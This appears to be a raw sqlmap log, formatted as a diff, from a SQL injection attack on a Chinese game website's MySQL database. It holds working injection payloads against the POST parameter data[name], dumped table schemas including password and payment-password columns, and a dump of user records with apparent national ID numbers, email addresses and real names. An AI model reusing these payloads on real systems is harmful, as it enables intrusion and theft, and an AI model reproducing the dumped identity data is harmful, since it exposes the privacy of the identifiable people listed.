+| 321420 | 321712   | 341801197806254618 | NULL      | 1   | NULL | NULL | caibei429214@21cn.com  | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 岑贵嘉      | NULL     | NULL     | 0        | 0        | NULL     | 聚壹阁夜魅              | NULL        |
+| 321421 | 321713   | 54012419900630835X | NULL      | 1   | NULL | NULL | 438411135@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 尤天竣      | NULL     | NULL     | 0        | 0        | NULL     | lan                | NULL        |
+| 321422 | 321714   | 450221198003130541 | NULL      | 1   | NULL | NULL | gudeng58@sogou.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 严盈瑛      | NULL     | NULL     | 0        | 0        | NULL     | gugu               | NULL        |
+| 321423 | 321715   | 371302199006152043 | NULL      | 1   | NULL | NULL | tuxun85@163.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 井秋花      | NULL     | NULL     | 0        | 0        | NULL     | 金秋华                | NULL        |
+| 321424 | 321716   | 220104198508296913 | NULL      | 1   | NULL | NULL | 2366760398@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 姚继阳      | NULL     | NULL     | 0        | 0        | NULL     | woaini963          | NULL        |
+| 321425 | 321717   | 411425198806063936 | NULL      | 1   | NULL | NULL | 597217352@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 何永威      | NULL     | NULL     | 0        | 0        | NULL     | 贵族浪人               | NULL        |
+| 321426 | 321718   | 230804199006110511 | NULL      | 1   | NULL | NULL | 2496866652@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 田柏奎      | NULL     | NULL     | 0        | 0        | NULL     | 爱上你是我的错            | NULL        |
+| 321427 | 321719   | 220302199612071020 | NULL      | 1   | NULL | NULL | 1156653272@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 吕馨玲      | NULL     | NULL     | 0        | 0        | NULL     | 东北土豆               | NULL        |
+| 321428 | 321720   | 360824199007254335 | NULL      | 1   | NULL | NULL | jingtao@yahoo.com.cn   | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 杨革国      | NULL     | NULL     | 0        | 0        | NULL     | 想见你                | NULL        |
+| 321429 | 321721   | 211226195512120215 | NULL      | 1   | NULL | NULL | xyx60124@163.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 夏永祥      | NULL     | NULL     | 0        | 0        | NULL     | 贵族明月               | NULL        |
+| 321430 | 321722   | 230183198510280619 | NULL      | 1   | NULL | NULL | pp3465@sina.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 胡文秀      | NULL     | NULL     | 0        | 0        | NULL     | Woody              | NULL        |
+| 321431 | 321723   | 211282198902024610 | NULL      | 1   | NULL | NULL | 623051818@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 马闯       | NULL     | NULL     | 0        | 0        | NULL     | 东北皇帝               | NULL        |
+| 321432 | 321724   | 350524198902213043 | NULL      | 1   | NULL | NULL | 369253728@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 翁群婷      | NULL     | NULL     | 0        | 0        | NULL     | 聚壹阁噹噹              | NULL        |
+| 321433 | 321725   | 360312197304088060 | NULL      | 1   | NULL | NULL | 271571949@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 宗景虹      | NULL     | NULL     | 0        | 0        | NULL     | 亲爱滴芒果              | NULL        |
+| 321434 | 321726   | 220284198108275416 | NULL      | 1   | NULL | NULL | 1337754595@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 乔会昌      | NULL     | NULL     | 0        | 0        | NULL     | 东北承诺               | NULL        |
+| 321435 | 321727   | 452523197307249011 | NULL      | 1   | NULL | NULL | 251995187@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 杨一帆      | NULL     | NULL     | 0        | 0        | NULL     | 6950510            | NULL        |
+| 321436 | 321728   | 320113198304091211 | NULL      | 1   | NULL | NULL | 656050016@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 宣琦       | NULL     | NULL     | 0        | 0        | NULL     | 东北南京               | NULL        |
+| 321437 | 321729   | 430521199007010579 | NULL      | 1   | NULL | NULL | wuzhaohui52526@qq.com  | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 赵健       | NULL     | NULL     | 0        | 0        | NULL     | 东北梦醒               | NULL        |
+| 321438 | 321730   | 152128199410291240 | NULL      | 1   | NULL | NULL | 76482208@qq.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 王倩       | NULL     | NULL     | 0        | 0        | NULL     | wangqian           | NULL        |
+| 321439 | 321731   | 36073219900801328X | NULL      | 1   | NULL | NULL | zhuiji4@126.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 弓瑶蝶      | NULL     | NULL     | 0        | 0        | NULL     | 坏小子                | NULL        |
+| 321440 | 321732   | 350322199702151555 | NULL      | 1   | NULL | NULL | 2745540410@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 林一城      | NULL     | NULL     | 0        | 0        | NULL     | 808080             | NULL        |
+| 321441 | 321733   | 510502197105206024 | NULL      | 1   | NULL | NULL | 1617781809@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 王大锤      | NULL     | NULL     | 0        | 0        | NULL     | 贵族雪儿               | NULL        |
+| 321442 | 321734   | 372301198710183417 | NULL      | 1   | NULL | NULL | 348403601@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 姜超       | NULL     | NULL     | 0        | 0        | NULL     | 九黎随风               | NULL        |
+| 321443 | 321735   | 430422199506181576 | NULL      | 1   | NULL | NULL | 1367429562@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 易并乡      | NULL     | NULL     | 0        | 0        | NULL     | 湘少                 | NULL        |
+| 321444 | 321736   | 370223621211275    | NULL      | 1   | NULL | NULL | 1593486192@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李桂林      | NULL     | NULL     | 0        | 0        | NULL     | 九黎宁明               | NULL        |
+| 321445 | 321737   | 230524198305072011 | NULL      | 1   | NULL | NULL | 425250058@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 邱杨       | NULL     | NULL     | 0        | 0        | NULL     | 聚壹阁-参股             | NULL        |
+| 321446 | 321738   | 211324198210283023 | NULL      | 1   | NULL | NULL | 2336889163@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 沈志娟      | NULL     | NULL     | 0        | 0        | NULL     | 东北穿越               | NULL        |
+| 321447 | 321739   | 371625199007291820 | NULL      | 1   | NULL | NULL | migan36@163.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 岑秋萌      | NULL     | NULL     | 0        | 0        | NULL     | 贵族习惯               | NULL        |
+| 321448 | 321740   | 420115199302220017 | NULL      | 1   | NULL | NULL | 1204169552@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 林龙       | NULL     | NULL     | 0        | 0        | NULL     | 九黎苏瑾               | NULL        |
+| 321449 | 321741   | 230123197811302235 | NULL      | 1   | NULL | NULL | 15648832@qq.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李四       | NULL     | NULL     | 0        | 0        | NULL     | hgt                | NULL        |
+| 321450 | 321742   | 310109199006244548 | NULL      | 1   | NULL | NULL | 930247874@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 胡滢皦      | NULL     | NULL     | 0        | 0        | NULL     | 雪雪                 | NULL        |
+| 321451 | 321743   | 370481198706151530 | NULL      | 1   | NULL | NULL | 291079090@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙凤良      | NULL     | NULL     | 0        | 0        | NULL     | 贵族风                | NULL        |
+| 321452 | 321744   | 510311198906234519 | NULL      | 1   | NULL | NULL | 16896073429@qq.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 杨荣平      | NULL     | NULL     | 0        | 0        | NULL     | 35465-奋斗           | NULL        |
++--------+----------+--------------------+-----------+-----+------+------+------------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+--------------------+-------------+
+
+Database: 5ebo
+Table: ebogame_content
+[0 entries]
++--------+
+| areaid |
++--------+
++--------+
+
+Database: 5ebo
+Table: ebogame_game_areas
+[0 entries]
++----------+
+| admin_id |
++----------+
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: ebogame_member_login
+[7 columns]
++----------------+---------+
+| Column         | Type    |
++----------------+---------+
+| login_areaid   | int(4)  |
+| login_gameid   | int(4)  |
+| login_id       | int(11) |
+| login_memberid | int(11) |
+| login_newtime  | int(11) |
+| login_oldtime  | int(11) |
+| login_times    | int(4)  |
++----------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: ebogame_member_login
+[8 entries]
++--------------+----------+----------------+
+| login_gameid | login_id | login_memberid |
++--------------+----------+----------------+
+| 23           | 412734   | 321614         |
+| 23           | 412771   | 321608         |
+| 23           | 412772   | 321630         |
+| 23           | 412774   | 321623         |
+| 23           | 412775   | 321625         |
+| 23           | 412776   | 321646         |
+| 23           | 412777   | 321645         |
+| 23           | 412778   | 321647         |
++--------------+----------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: ebogame
+Table: ebogame_member_login
+[7 columns]
++----------------+---------+
+| Column         | Type    |
++----------------+---------+
+| login_areaid   | int(4)  |
+| login_gameid   | int(4)  |
+| login_id       | int(11) |
+| login_memberid | int(11) |
+| login_newtime  | int(11) |
+| login_oldtime  | int(11) |
+| login_times    | int(4)  |
++----------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: ebogame
+Table: ebogame_member_login
+[10 entries]
++--------------+----------+----------------+
+| login_gameid | login_id | login_memberid |
++--------------+----------+----------------+
+| 10           | 73       | 0              |
+| 10           | 74       | 0              |
+| 10           | 75       | 0              |
+| 9            | 76       | 0              |
+| 9            | 77       | 0              |
+| 9            | 78       | 0              |
+| 9            | 79       | 0              |
+| 10           | 80       | 0              |
+| 10           | 81       | 0              |
+| 10           | 82       | 0              |
++--------------+----------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: ebogame
+Table: ebogame_member
+[24 columns]
++----------------+-----------+
+| Column         | Type      |
++----------------+-----------+
+| 56xiu_id       | char(50)  |
+| codestate      | int(1)    |
+| display        | int(1)    |
+| error_count    | int(1)    |
+| error_time     | int(11)   |
+| id             | int(11)   |
+| integral       | int(11)   |
+| integral_get   | int(11)   |
+| integral_use   | int(11)   |
+| name           | char(20)  |
+| newip          | char(20)  |
+| newtime        | int(11)   |
+| oldip          | char(20)  |
+| oldtime        | int(11)   |
+| password       | char(40)  |
+| password_nomd5 | char(20)  |
+| password_old   | char(20)  |
+| pay_pass       | char(40)  |
+| pay_pass_nomd5 | char(20)  |
+| regtime        | int(11)   |
+| role           | char(2)   |
+| times          | int(11)   |
+| urlsource      | char(100) |
+| yiqidd_id      | int(11)   |
++----------------+-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
